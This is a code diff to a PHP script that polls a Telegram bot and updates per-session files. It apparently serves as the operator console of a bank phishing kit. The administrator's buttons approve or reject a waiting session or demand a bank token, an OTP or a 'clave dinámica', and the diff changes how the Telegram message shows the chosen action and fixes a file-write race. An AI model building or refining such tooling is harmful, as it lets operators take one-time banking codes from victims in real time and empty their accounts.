@@ -111,19 +111,36 @@ foreach ($tgData['result'] as $update) {
         $sessData['action'] = $action;
         $sessData['lastUpdateId'] = $lastUpdateId;
 
-        // Quitar SOLO los botones del mensaje en Telegram (mantener texto original)
+        // Actualizar mensaje en Telegram: quitar botones y mostrar acción tomada
         $msgId = $sessData['messageId'] ?? null;
         if ($msgId) {
-            $editBody = http_build_query([
+            // Determinar texto de acción
+            $actionLabels = [
+                'aprobar'  => '✅ Aceptado',
+                'rechazar' => '❌ Rechazado',
+                'token'    => '🏦 Token solicitado',
+                'otp'      => '🔐 OTP solicitado',
+                'dinamica' => '💳 Clave dinámica solicitada'
+            ];
+            $actionText = $actionLabels[$action] ?? 'Acción realizada';
+
+            // Obtener texto original y reemplazar el estado
+            $originalText = $sessData['messageText'] ?? '';
+            $newText = preg_replace('/\n\n⏳ Esperando acción del administrador\.\.\./', "\n\n<b>{$actionText}</b>", $originalText);
+
+            // Editar texto del mensaje
+            $editTextBody = http_build_query([
                 'chat_id'      => $config['chat_id'],
                 'message_id'   => $msgId,
+                'text'         => $newText,
+                'parse_mode'   => 'HTML',
                 'reply_markup' => json_encode(['inline_keyboard' => []])
             ]);
 
-            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageReplyMarkup");
+            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
             curl_setopt_array($ch, [
                 CURLOPT_POST           => true,
-                CURLOPT_POSTFIELDS     => $editBody,
+                CURLOPT_POSTFIELDS     => $editTextBody,
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_TIMEOUT        => 10,
                 CURLOPT_SSL_VERIFYPEER => true
@@ -149,13 +166,17 @@ foreach ($tgData['result'] as $update) {
 }
 
 // ── Actualizar lastUpdateId en la sesión consultada ──
+// IMPORTANTE: leer el archivo de NUEVO antes de escribir, porque el loop
+// pudo haberlo actualizado (status/action) y no queremos sobreescribir.
 if ($lastUpdateId > ($session['lastUpdateId'] ?? 0)) {
     $fp = fopen($sessionFile, 'r+');
     if ($fp && flock($fp, LOCK_EX)) {
-        $session['lastUpdateId'] = $lastUpdateId;
+        $freshContent = stream_get_contents($fp);
+        $freshSession = json_decode($freshContent, true) ?: [];
+        $freshSession['lastUpdateId'] = $lastUpdateId;
         ftruncate($fp, 0);
         rewind($fp);
-        fwrite($fp, json_encode($session));
+        fwrite($fp, json_encode($freshSession));
         fflush($fp);
         flock($fp, LOCK_UN);
         fclose($fp);
